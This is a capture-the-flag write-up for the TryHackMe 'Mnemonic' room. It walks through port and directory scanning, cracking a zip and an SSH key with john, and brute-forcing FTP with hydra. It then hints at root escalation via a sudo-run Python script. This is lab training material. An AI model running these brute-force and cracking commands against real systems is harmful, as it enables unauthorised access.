# Mnemonic

Available on: [TryHackMe](https://tryhackme.com/room/mnemonic)

Made by: [villwocki](https://tryhackme.com/p/villwocki)

A medium level room.

## Enumerate

### How many ports are open?

Scan with nmap 

`nmap -sC -sV -p- -vv -oN nmap.txt IP`

Output:
```
Not shown: 65532 closed ports
Reason: 65532 resets
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.3
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
| http-robots.txt: 1 disallowed entry 
|_/webmasters/*
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1337/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e0:42:c0:a5:7d:42:6f:00:22:f8:c7:54:aa:35:b9:dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+cUIYV9ABbcQFihgqbuJQcxu2FBvx0gwPk5Hn+Eu05zOEpZRYWLq2CRm3++53Ty0R7WgRwayrTTOVt6V7yEkCoElcAycgse/vY+U4bWr4xFX9HMNElYH1UztZnV12il/ep2wVd5nn//z4fOllUZJlGHm3m5zWF/k5yIh+8x7T7tfYNsoJdjUqQvB7IrcKidYxg/hPDWoZ/C+KMXij1n3YXVoDhQwwR66eUF1le90NybORg5ogCfBLSGJQhZhALBLLmxAVOSc4e+nhT/wkhTkHKGzUzW6PzA7fTN3Pgt81+m9vaxVm/j7bXG3RZSzmKlhrmdjEHFUkLmz6bjYu3201
|   256 23:eb:a9:9b:45:26:9c:a2:13:ab:c1:ce:07:2b:98:e0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOJp4tEjJbtHZZtdwGUu6frTQk1CzigA1PII09LP2Edpj6DX8BpTwWQ0XLNSx5bPKr5sLO7Hn6fM6f7yOy8SNHU=
|   256 35:8f:cb:e2:0d:11:2c:0b:63:f2:bc:a0:34:f3:dc:49 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIiax5oqQ7hT7CgO0CC7FlvGf3By7QkUDcECjpc9oV9k
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### What is the ssh port number?

Consult the nmap output


### What is the name of the secret file?

*On Kali all wordlists can be found in the `/usr/share/wordlists/` directory*

We can enumerate the website, with gobuster

`gobuster dir -u http://IP -w common.txt -t 15`

output: 

```
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
/webmasters (Status: 301)
```
In robots.txt we have the directory `/webmasters` disallowed. So lets bruteforce that

`gobuster dir -u http://IP/webmasters -w common.txt -t 15`

output:

```
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/admin (Status: 301)
/backups (Status: 301)
/index.html (Status: 200)
```
These lead to nothing, lets try with a bigger wordlist and see whats in `/backups` 

I ran two instances of gobuster:

`gobuster dir -u http://IP/webmasters/backups/ -w directory-list-2.3-medium.txt -t 15 -x zip,7z,gzip`
and
`gobuster dir -u http://IP/webmasters/backups/ -w directory-list-2.3-medium.txt -t 15 -x js,php,py,txt,html,db`

And let it go for a while. I tried bruteforcing ftp with nmap scripts as well:

`nmap --script ftp-brute -p 21 IP`

Looking for zips with gobuster shows `backups.zip`, after downloading it I see that it is password protected, this is when we use `zip2john backups.zip > ziphash` to get a hash file ready for john to crack.

Then simply run john and you should get this output 
```
$ john --wordlists=rockyou.txt ziphash

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
00385007         (backups.zip/backups/note.txt)
1g 0:00:00:02 DONE (2021-01-09 05:05) 0.4291g/s 6122Kp/s 6122Kc/s 6122KC/s 00661690..00257gbjr
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Simply use the `--show` option and open the zip.

## Credentials

Inside the `note.txt` file we have a message:

```
@vill

James new ftp username: *****
we have to work hard
```

### ftp user name?

In the note

### ftp password?

Time for some `hydra`

Use the following syntax `hydra -l USER_FROM_NOTE -P rockyou.txt IP ftp -V -f -t 15` obviously, you will have to replace the options that are specific to you. Sometimes it reducing the number of threads to maybe 4 works better. See for yourself.

Now that we have the password, lets login! 

```
ftp> ls

drwxr-xr-x    2 0        0            4096 Jul 13 21:16 data-1
drwxr-xr-x    2 0        0            4096 Jul 13 21:17 data-10
drwxr-xr-x    2 0        0            4096 Jul 13 21:16 data-2
drwxr-xr-x    2 0        0            4096 Jul 13 21:16 data-3
drwxr-xr-x    4 0        0            4096 Jul 14 18:05 data-4
drwxr-xr-x    2 0        0            4096 Jul 13 21:16 data-5
drwxr-xr-x    2 0        0            4096 Jul 13 21:17 data-6
drwxr-xr-x    2 0        0            4096 Jul 13 21:17 data-7
drwxr-xr-x    2 0        0            4096 Jul 13 21:17 data-8
drwxr-xr-x    2 0        0            4096 Jul 13 21:17 data-9
```
That's a massive directory listing, lets just get it all with 
`wget -r ftp://[user]:[password]@IP/`

now lets look for all the files, we can use `find` to achieve this.

`cd IP; find . -type f`
```
./data-4/id_rsa
./data-4/not.txt
./.bash_logout
./.profile
./.bashrc
```
Very interesting listing!

### ssh username?

The answer is in one of the files

### ssh password?

Why do we even need one? We have the ssh key! Just slap some `chmod 600` on it and we can connect right? Wrong.
```
Enter passphrase for key '10.10.15.112/data-4/id_rsa': 
```
It needs a passphrase, `ssh2john` to the rescue it is. use `ssh2john id_rsa > sshhash` to prepare it for john and then we can crack: 

```
$ john --wordlist=rockyou.txt sshhash

$ john --show sshhash
```
and we have the password

### What is the condor password?

After login we can see some notes in our home directory again. And it mentions `condor`... whats in his home directory? List it, see if you can figure out the `base`

You should have an image if you managed to solve the `base` hint. Now how do we get something useful from it? Well the hint is in the name! [Mnemonic](https://github.com/MustafaTanguner/Mnemonic) is a tool to crack images with a set of ascii codes. From the machine we have a set of codes! Now we just give it the image and we have a password :) 

## Hack the machine

### user.txt

you should already have this one :)

### root.txt

we are condor, how can we escalate to root? check `sudo -l`.  We can run examplecode.py as sudo, interesting, lets do it!
```
------------information systems script beta--------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	----------------@author villwocki------------------

Running...



	#Network Connections   [1]

	#Show İfconfig         [2]

	#Show ip route         [3]

	#Show Os-release       [4]

        #Root Shell Spawn      [5]           

        #Print date            [6]

	#Exit                  [0]

	

Select:5

Running
.......
System rebooting....
Connection to 10.10.15.112 closed by remote host.
Connection to 10.10.15.112 closed.
```
*If you fell for it as well, you might have to terminate and deploy the machine again*

So it's a lie, can we see the source code?? `cat /bin/examplecode.py` and we see something interesting. When we quit with 0, there is more than one option. Using `.` we get command execution with root permissions. Think how to get a shell and the flag is yours! (maybe hash it first :) )
